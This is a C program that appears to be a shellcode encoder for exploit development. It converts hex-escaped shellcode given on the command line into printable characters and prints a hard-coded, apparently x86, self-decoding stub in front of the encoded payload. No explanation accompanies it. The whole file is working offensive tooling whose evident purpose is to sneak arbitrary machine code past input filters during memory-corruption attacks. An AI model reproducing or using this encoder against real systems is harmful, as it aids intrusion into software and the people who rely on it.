#include<stdio.h>
#include<string.h>
#include<stdlib.h>
int main(int argc,char **argv)
{
	if(argc != 2)
	{
		fprintf(stderr,"Usage: ./encoder shellcode\n");
		return -1;
	}
	int n = strlen(argv[1])/4;
	//printf("Shellcode Size : %d\n",n);
	int k = n;
	n = n + n%2;
	int e_n = ((3*n)/2)+2;
	unsigned char encoded[e_n];	
	int i,j;
	j = 0;
	char end = 0x26;
	for(i = 0 ; i < n ; i++)
	{
		char temp[5];
		temp[0] = argv[1][4*i+2];
		temp[1] = argv[1][4*i+3];
		i++;
		if(i == k)
		{
			temp[2] = '9';
			temp[3] = '0';
		}
		else
		{
			temp[2] = argv[1][4*i+2];
			temp[3] = argv[1][4*i+3];
		}
		temp[4]='\0';	
		unsigned int x = strtoul(temp,0,16);
		unsigned int c = (0x3f & x) + 0x3F; 		//0x30 + ((0xf000 & x) >> 12);
		unsigned int b = ((x >> 6) & 0x3f) + 0x3F ;	//((((0xc00 & x) >> 10) + 0x4) << 4) + ((0x300 & x) >> 6) + ((0xc0 & x) >> 6);
		unsigned int a = ((x >> 12) & 0xf) + 0x3F ;	//0x40 + (0x30 & x) + (0xf & x);
	       	encoded[3*j] = a;
		encoded[3*j+1] = b;
		encoded[3*j+2] = c;
		j++;
	}
	encoded[3*j] = end;
	encoded[e_n-1] = '\0';
	char decoder[] = "\x60\x50\x59\x6a\x30\x58\x34\x30\x48\x50\x5b\x6a\x30\x58\x30\x59\x35\x30\x41\x4f\x30\x59\x4f\x30\x59\x60\x30\x41\x61\x30\x59\x61\x30\x41\x62\x30\x59\x69\x30\x41\x6a\x30\x59\x6a\x30\x41\x6b\x30\x59\x6d\x30\x59\x6e\x72\x49\x49\x30\x59\x37\x30\x41\x38\x30\x59\x38\x30\x41\x39\x30\x59\x3d\x30\x59\x3e\x30\x59\x47\x51\x5a\x4f\x79\x49\x26\x74\x3c\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x49\x43\x3f\x2c\x34\x32\x41\x4a\x40\x24\x3C\x3f\x27\x32\x30\x27\x77\x42\x49\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x4a\x43\x32\x41\x4b\x40\x3f\x2c\x36\x24\x3f\x30\x27\x77\x42\x4a\x42\x42\x41\x41\x41\x75\x41\x61"; 
	printf("%s%s\n",decoder,encoded);
	return 0;
}
